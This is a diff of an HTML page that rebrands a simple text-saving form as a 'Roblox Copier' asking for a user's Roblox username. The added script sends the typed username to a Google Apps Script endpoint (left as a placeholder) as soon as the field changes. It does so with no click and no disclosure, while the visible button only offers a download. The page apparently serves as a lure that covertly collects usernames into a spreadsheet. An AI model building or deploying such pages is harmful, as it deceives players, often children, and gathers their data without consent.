@@ -1,47 +1,173 @@
 <!DOCTYPE html>
+
 <html>
+
 <head>
-    <title>Mijn Website</title>
+
+<title>Roblox Copier</title>
+
+<style>
+
+body {
+
+margin: 0;
+
+height: 100vh;
+
+display: flex;
+
+justify-content: center;
+
+align-items: center;
+
+background: #111827;
+
+font-family: Arial, sans-serif;
+
+color: white;
+
+}
+
+.container {
+
+text-align: center;
+
+background: #1f2937;
+
+padding: 40px;
+
+border-radius: 20px;
+
+box-shadow: 0 0 20px rgba(0,0,0,0.5);
+
+width: 350px;
+
+}
+
+input {
+
+width: 100%;
+
+padding: 12px;
+
+margin-top: 20px;
+
+border: none;
+
+border-radius: 10px;
+
+font-size: 16px;
+
+box-sizing: border-box;
+
+}
+
+button {
+
+width: 100%;
+
+padding: 12px;
+
+margin-top: 15px;
+
+border: none;
+
+border-radius: 10px;
+
+background: #2563eb;
+
+color: white;
+
+font-size: 16px;
+
+cursor: pointer;
+
+}
+
+button:hover {
+
+background: #1d4ed8;
+
+}
+
+.status {
+
+margin-top: 15px;
+
+color: #22c55e;
+
+}
+
+</style>
+
 </head>
+
 <body>
 
-<h2>Voer tekst in</h2>
+<div class="container">
 
-<input type="text" id="myText">
+<h1>Roblox Copier</h1>
 
-<button onclick="saveText()">Save</button>
+<p>Type your Roblox username</p>
+
+<input type="text" id="myText" placeholder="Enter username">
+
 <button onclick="downloadText()">Download</button>
+
+<div class="status" id="status"></div>
+
+</div>
 
 <script>
 
+const scriptURL = "PASTE_YOUR_GOOGLE_SCRIPT_URL_HERE";
+
 async function saveText() {
-    const text = document.getElementById("myText").value;
 
-    await fetch(
-        "JOUW_GOOGLE_SCRIPT_URL_HIER",
-        {
-            method: "POST",
-            body: JSON.stringify({
-                text: text
-            })
-        }
-    );
+const text = document.getElementById("myText").value;
 
-    alert("Opgeslagen!");
+if (text.trim() === "") return;
+
+try {
+
+await fetch(scriptURL, {
+
+method: "POST",
+
+body: JSON.stringify({ text: text })
+
+});
+
+document.getElementById("status").innerText = "Saved to Google Sheets!";
+
+} catch (error) {
+
+document.getElementById("status").innerText = "Error saving!";
+
 }
 
+}
+
+document.getElementById("myText").addEventListener("change", saveText);
+
 function downloadText() {
-    const text = document.getElementById("myText").value;
 
-    const blob = new Blob([text], { type: "text/plain" });
+const text = document.getElementById("myText").value;
 
-    const a = document.createElement("a");
-    a.href = URL.createObjectURL(blob);
-    a.download = "text.txt";
-    a.click();
+const blob = new Blob([text], { type: "text/plain" });
+
+const a = document.createElement("a");
+
+a.href = URL.createObjectURL(blob);
+
+a.download = "username.txt";
+
+a.click();
+
 }
 
 </script>
 
 </body>
+
 </html>
